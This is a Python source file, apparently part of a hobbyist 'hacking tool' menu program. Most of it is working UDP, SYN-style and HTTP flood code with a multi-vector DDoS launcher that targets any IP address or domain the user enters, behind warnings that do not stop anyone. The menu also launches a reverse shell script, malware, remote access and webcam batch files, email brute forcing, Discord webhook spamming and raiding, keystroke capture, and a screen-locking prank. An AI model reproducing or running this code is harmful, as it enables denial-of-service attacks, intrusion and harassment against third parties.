#---------------------------------------------------------------------------------------------------------
            
def udp_flood(target_ip, port, duration):
    """UDP Flood attack"""
    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1490)
    
    sent = 0
    start_time = time.time()
    end_time = start_time + duration
    
    while time.time() < end_time:
        try:
            sock.sendto(bytes_to_send, (target_ip, port))
            sent += 1
            if sent % 500 == 0:  # Update progress less frequently to increase speed
                elapsed = time.time() - start_time
                print(f"[UDP] Packets sent: {sent} | {sent/elapsed:.2f} packets/sec", end="\r")
        except:
            print(f"\n{RED}Error sending UDP packet. Connection might be down.{RESET}")
            break
    
    return sent
#---------------------------------------------------------------------------------------------------------
def syn_flood(target_ip, port, duration):
    """SYN Flood attack simulation"""
    # Note: This is a simplified simulation of a SYN flood
    # It doesn't actually perform a real SYN flood which would require raw sockets and root privileges
    
    sent = 0
    start_time = time.time()
    end_time = start_time + duration
    
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.01)  # Very short timeout to avoid hanging
            s.connect_ex((target_ip, port))  # Attempt connection and ignore result
            s.close()
            sent += 1
            if sent % 100 == 0:
                elapsed = time.time() - start_time
                print(f"[SYN] Connection attempts: {sent} | {sent/elapsed:.2f} conn/sec", end="\r")
        except:
            pass
    
    return sent
#---------------------------------------------------------------------------------------------------------
def http_flood(target_ip, port, duration):
    """HTTP Flood attack simulation"""
    headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept-language: en-US,en",
        "Connection: Keep-Alive"
    ]
    
    sent = 0
    start_time = time.time()
    end_time = start_time + duration
    
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, port))
            
            # Send a simple HTTP GET request
            request = f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\nHost: {target_ip}\r\n"
            for header in headers:
                request += header + "\r\n"
            request += "\r\n"
            
            s.send(request.encode())
            s.close()
            
            sent += 1
            if sent % 50 == 0:
                elapsed = time.time() - start_time
                print(f"[HTTP] Requests sent: {sent} | {sent/elapsed:.2f} req/sec", end="\r")
                
        except:
            pass
    
    return sent
#---------------------------------------------------------------------------------------------------------
def multi_vector_attack(target_ip, port, duration, methods):
    """Launch a multi-vector attack using multiple methods simultaneously"""
    threads = []
    results = {"udp": 0, "syn": 0, "http": 0}
    
    print(f"\n{RED}Starting multi-vector stress test on {target_ip}:{port}{RESET}")
    print(f"Duration: {duration} seconds")
    print(f"Attack vectors: {', '.join(methods)}")
    print("Press Ctrl+C to stop the attack...\n")
    
    start_time = time.time()
    
    try:
        # Start a thread for each attack vector
        if "udp" in methods:
            udp_thread = threading.Thread(target=lambda: results.update({"udp": udp_flood(target_ip, port, duration)}))
            udp_thread.daemon = True
            threads.append(udp_thread)
            udp_thread.start()
            
        if "syn" in methods:
            syn_thread = threading.Thread(target=lambda: results.update({"syn": syn_flood(target_ip, port, duration)}))
            syn_thread.daemon = True
            threads.append(syn_thread)
            syn_thread.start()
            
        if "http" in methods and port in [80, 443, 8080]:
            http_thread = threading.Thread(target=lambda: results.update({"http": http_flood(target_ip, port, duration)}))
            http_thread.daemon = True
            threads.append(http_thread)
            http_thread.start()
        
        # Wait for all threads to complete or for the duration to expire
        end_time = start_time + duration
        while time.time() < end_time and any(t.is_alive() for t in threads):
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        print(f"\n\n{RED}Attack interrupted by user.{RESET}")
    finally:
        elapsed = time.time() - start_time
        
        print(f"\n\n{GREEN}Attack Summary:{RESET}")
        print(f"Total elapsed time: {elapsed:.2f} seconds")
        
        if "udp" in methods:
            print(f"UDP Flood: {results['udp']} packets sent ({results['udp']/elapsed:.2f} packets/sec)")
        if "syn" in methods:
            print(f"SYN Flood: {results['syn']} connection attempts ({results['syn']/elapsed:.2f} conn/sec)")
        if "http" in methods and port in [80, 443, 8080]:
            print(f"HTTP Flood: {results['http']} requests sent ({results['http']/elapsed:.2f} req/sec)")
            
        total_packets = sum(results.values())
        print(f"Total packets/requests: {total_packets} ({total_packets/elapsed:.2f} packets/sec)")
    
    input("\nPress Enter to continue...")

#---------------------------------------------------------------------------------------------------------
def ddos_attack_menu():
    # Port config
    port_mode = True
    port = 80
    
    while True:
        clear_screen()
        print(f"{RED}DDoS ATTACK TOOL{RESET}\n")
        print(f"{BOLD}WARNING: ONLY USE ON NETWORKS YOU OWN OR HAVE PERMISSION TO TEST{RESET}")
        print(f"{BOLD}MISUSE OF THIS TOOL IS ILLEGAL AND UNETHICAL{RESET}\n")
        
        print("1. Target Setup")
        print("2. Attack Configuration")
        print("3. Launch Attack")
        print("4. Back to Main Menu")
        
        choice = input(f"\n{BOLD}Select an option:{RESET} ")
        
        if choice == "1":
            # Target setup
            print("\nSelect target method:")
            print("1. Domain Name")
            print("2. IP Address")
            
            target_method = input("\nEnter choice: ")
            
            if target_method == "1":
                target_ip = resolve_domain()
                if not target_ip:
                    print(f"{RED}Failed to resolve domain. Please try again.{RESET}")
                    time.sleep(2)
                    continue
            elif target_method == "2":
                target_ip = input(f"\n{BLUE}Enter target IP:{RESET} ").strip()
                if not is_valid_ip(target_ip):
                    print(f"{RED}Invalid IP address format. Please try again.{RESET}")
                    time.sleep(2)
                    continue
            else:
                print(f"{RED}Invalid choice!{RESET}")
                time.sleep(1)
                continue
                
            # Port configuration
            port_input = input(f"\n{BLUE}Target port (default: 80):{RESET} ")
            if port_input:
                try:
                    port = int(port_input)
                    if port < 1 or port > 65535:
                        print(f"{RED}Invalid port! Using default port 80.{RESET}")
                        port = 80
                except:
                    print(f"{RED}Invalid port! Using default port 80.{RESET}")
                    port = 80
            
            print(f"\n{GREEN}Target configured: {target_ip}:{port}{RESET}")
            time.sleep(2)
            
        elif choice == "2":
            # Attack configuration
            if 'target_ip' not in locals():
                print(f"{RED}Error: You must configure a target first!{RESET}")
                time.sleep(2)
                continue
                
            print("\nSelect attack methods:")
            print("1. UDP Flood (recommended)")
            print("2. SYN Flood")
            print("3. HTTP Flood (only for web servers)")
            print("4. Multi-Vector (combines multiple methods)")
            
            attack_choice = input("\nEnter choice: ")
            
            if attack_choice == "1":
                attack_method = ["udp"]
                print(f"{GREEN}Attack method set to UDP Flood{RESET}")
            elif attack_choice == "2":
                attack_method = ["syn"]
                print(f"{GREEN}Attack method set to SYN Flood{RESET}")
            elif attack_choice == "3":
                if port not in [80, 443, 8080]:
                    print(f"{RED}Warning: HTTP Flood works best on standard web ports (80, 443, 8080){RESET}")
                attack_method = ["http"]
                print(f"{GREEN}Attack method set to HTTP Flood{RESET}")
            elif attack_choice == "4":
                attack_method = ["udp", "syn"]
                if port in [80, 443, 8080]:
                    attack_method.append("http")
                print(f"{GREEN}Attack method set to Multi-Vector{RESET}")
            else:
                print(f"{RED}Invalid choice! Using UDP Flood as default.{RESET}")
                attack_method = ["udp"]
            
            # Duration configuration
            duration_input = input(f"\n{BLUE}Attack duration in seconds (10-300, default: 60):{RESET} ")
            if duration_input:
                try:
                    duration = int(duration_input)
                    if duration < 10:
                        print(f"{RED}Duration too short! Setting to minimum (10 seconds).{RESET}")
                        duration = 10
                    elif duration > 300:
                        print(f"{RED}Duration too long! Setting to maximum (300 seconds).{RESET}")
                        duration = 300
                except:
                    print(f"{RED}Invalid duration! Using default (60 seconds).{RESET}")
                    duration = 60
            else:
                duration = 60
                
            print(f"\n{GREEN}Attack configured:{RESET}")
            print(f"Methods: {', '.join(attack_method)}")
            print(f"Duration: {duration} seconds")
            time.sleep(2)
            
        elif choice == "3":
            # Launch attack
            if 'target_ip' not in locals() or 'attack_method' not in locals():
                print(f"{RED}Error: You must configure target and attack settings first!{RESET}")
                time.sleep(2)
                continue
            
            # Final confirmation
            print(f"\n{RED}{BOLD}FINAL WARNING:{RESET}")
            print(f"You are about to launch a DDoS attack on {target_ip}:{port}")
            print("Attack method: " + ", ".join(attack_method))
            print(f"Duration: {duration} seconds")
            print(f"\n{BOLD}THIS SHOULD ONLY BE DONE ON NETWORKS YOU OWN OR HAVE PERMISSION TO TEST.{RESET}")
            print(f"{BOLD}UNAUTHORIZED ATTACKS ARE ILLEGAL AND CAN RESULT IN CRIMINAL CHARGES.{RESET}")
            
            confirm = input(f"\n{RED}Type 'CONFIRM' to proceed:{RESET} ")
            
            if confirm == "CONFIRM":
                multi_vector_attack(target_ip, port, duration, attack_method)
            else:
                print(f"{GREEN}Attack cancelled.{RESET}")
                time.sleep(1)
            
        elif choice == "4":
            return
            
        else:
            print(f"{RED}Invalid choice!{RESET}")
            time.sleep(1)
#---------------------------------------------------------------------------------------------------------
def start_revshell():
  thonny_path = r"C:\Users\modat\AppData\Local\Programs\Thonny\thonny.exe"
  script_path = r"C:\Users\modat\OneDrive\Desktop\resources\revshell.py"

  command = f'powershell -Command "Start-Process \'{thonny_path}\' -ArgumentList \'--run\', \'{script_path}\'"'

  subprocess.run(command, shell=True)
#---------------------------------------------------------------------------------------------------------
def hide_taskbar():
     hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
     win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

# Show taskbar again on exit
def show_taskbar():
    hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
    win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
#---------------------------------------------------------------------------------------------------------
# Disable close button (Alt+F4)
def disable_close_button():
    hwnd = pygame.display.get_wm_info()['window']
    system_menu = ctypes.windll.user32.GetSystemMenu(hwnd, False)
    ctypes.windll.user32.DeleteMenu(system_menu, 0xF060, 0x00000000)  # SC_CLOSE
    ctypes.windll.user32.DrawMenuBar(hwnd)  # Refresh the menu bar
#---------------------------------------------------------------------------------------------------------
def play_video_and_mp3(mp4_path, mp3_path):
    pygame.init()
    screen_info = pygame.display.Info()
    screen = pygame.display.set_mode((screen_info.current_w, screen_info.current_h), pygame.NOFRAME | pygame.FULLSCREEN)
    pygame.display.set_caption("Meme Playback")
    
    disable_close_button()
    hide_taskbar()

    # Load and play the MP3 file in a loop
    pygame.mixer.init()
    pygame.mixer.music.load(mp3_path)
    pygame.mixer.music.play(-1)  # Loop the MP3 file indefinitely

    # Open the video file using OpenCV
    video = cv2.VideoCapture(mp4_path)
    if not video.isOpened():
        print("Error: Couldn't open video file")
        pygame.quit()
        sys.exit()

    clock = pygame.time.Clock()
    running = True

    while running:
        # Read the next frame from the video
        ret, frame = video.read()
        if not ret:
            # Restart the video from the beginning if it ends
            video.set(cv2.CAP_PROP_POS_FRAMES, 0)
            continue  # Skip processing this iteration and read again

        # Convert the frame to RGB and transpose dimensions
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        frame = cv2.transpose(frame)  # Correct orientation for Pygame

        # Convert the frame to a surface and scale to screen size
        frame_surface = pygame.surfarray.make_surface(frame)
        frame_surface = pygame.transform.scale(frame_surface, (screen_info.current_w, screen_info.current_h))

        # Display the frame
        screen.blit(frame_surface, (0, 0))
        pygame.display.update()

        # Handle events
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            elif event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
                running = False

        clock.tick(30)  # Control playback speed

    # Cleanup and exit
    video.release()
    pygame.mixer.music.stop()
    show_taskbar()
    pygame.quit()
    sys.exit()
#---------------------------------------------------------------------------------------------------------
def format_key(key: str) -> str:
    """Formats special keys (e.g., 'space' -> '[SPACE]')"""
    if len(key) > 1:
        return f"[{key.upper()}]"
    return key
#---------------------------------------------------------------------------------------------------------
def display_keystrokes():
    """Displays pressed keys in real-time until ESC is pressed."""
    print("🔑 Keystroke Capture Active (Press ESC to Exit)")
    print("-----------------------------------------------")
    
    while True:
        event = keyboard.read_event(suppress=True)  # Blocks until a key is pressed
        
        if event.event_type == "down":
            key = format_key(event.name)
            
            # Exit on ESC key
            if key == "[ESC]":
                print("\n🛑 Capture stopped.")
                break
            
            # Print formatted key with timestamp
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"{timestamp} → {key}")

#---------------------------------------------------------------------------------------------------------
def lookup_uk_number(number_str):
    # Automatically assumes the number is UK-based if no country code is given
    try:
        number = phonenumbers.parse(number_str, "GB")

        if not phonenumbers.is_valid_number(number):
            return "❌ Invalid UK phone number."

        result = {
            "Formatted Number": phonenumbers.format_number(number, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
            "Region": geocoder.description_for_number(number, "en"),
            "Carrier": carrier.name_for_number(number, "en"),
            "Type": number_type(number).__str__().split('.')[-1]
        }

        return result

    except phonenumbers.NumberParseException as e:
        return f"⚠️ Error parsing number: {e}"

    print("\n🔎 Lookup Result:")
    if isinstance(info, dict):
        for key, value in info.items():
            print(f"{key}: {value}")
    else:
        print(info)
#---------------------------------------------------------------------------------------------------------        
        
def hack_cameras():
    y = input("are you sure u want to do this? your requests can be traced to your address with out a proxy server ⚠︎  (y/n): ")
    if y == "y":
       print("finding nearby cameras...")
       time.sleep(5)
       print("2 monitoring devices located!")
       time.sleep(3)
       print("going for nearest one..")
       time.sleep(4)
       os.system(r"code\phonecam.bat")
    if y == "Y":
       print("finding nearby cameras...")
       time.sleep(5)
       print("2 monitoring devices located!")
       time.sleep(3)
       print("going for nearest one..")
       time.sleep(4)
       os.system(r"code\phonecam.bat")
    else:
        print("exiting...")
#---------------------------------------------------------------------------------------------------------        
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
#---------------------------------------------------------------------------------------------------------
def run_as_admin(script_path):
    params = ' '.join([f'"{arg}"' for arg in sys.argv])
    try:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, params, None, 1
        )
    except Exception as e:
        print(f"Failed to elevate: {e}")
#---------------------------------------------------------------------------------------------------------
def main():            
    while True:
        os.system('cls')
        slow_print(logo, delay=0.00005)
        time.sleep(0.3)
        slow_print(menu, delay=0.00005)
    
        x = input("""\033[38;2;255;0;0m
    ┌──(root㉿kali)-[~/mkztool]
    └─>\033[0m """)
        if x == "1":
           ip_lookup()
        elif x == "2":
             phone_input = input("Enter a UK phone number: ")
             info = lookup_uk_number(phone_input)
             if isinstance(info, dict):
                 for key, value in info.items():
                     print(f"{key}: {value}")                                       

        elif x == "3":
             temd = input("pick your option, eepsites (1) or Tor Links (2): ")
             if temd == "1":
                 eepsites()
             if temd == "2":
                 dark_web_links()
        elif x == "4":
             ddos_attack_menu()                                                     
        elif x == "5":
             emailbrute()                                                         
        elif x == "6":
             os.system(r'start "" "%LocalAppData%\Discord\Update.exe" --processStart Discord.exe')
        elif x == "7":
             webhook_url = input("Enter your Discord webhook URL: ")
             nitro_check(threads=10, webhook_url=webhook_url)                                                                        
        elif x == "8":
             webhook_deleter()
        elif x == "9":
             webhook_spammer()                                                                                  
        elif x == "10":
             discordraid()                                            
        elif x == "11":
             hack_cameras()                                              
        elif x == "12":
             os.system(r"code\malware.bat")                            
        elif x == "13":
             display_keystrokes()
        elif x == "14":
             os.system(r"code\remoteaccess.bat")
        elif x == "15":
             print("add mv4zz on discord for it, just keeping track who uses this program ;)")                                                
        elif x == "16":
             mp4_path = r"code\kingvon.gif"
             mp3_path = r"code\kingvon.mp3"
             play_video_and_mp3(mp4_path, mp3_path)
        elif x == "17":
             print("add mv4zz on discord for it, just keeping track who uses this program ;)")
        elif x == "18":
             os.system(r"code\laptopcam.bat")
        elif x == "19":
             print("Restarting script as admin...")
             run_as_admin(sys.argv[0])
        elif x == "20":
             main()
        else:
            print("[X] Invalid Input!")

        input("\nPress Enter to continue...")
        

main()
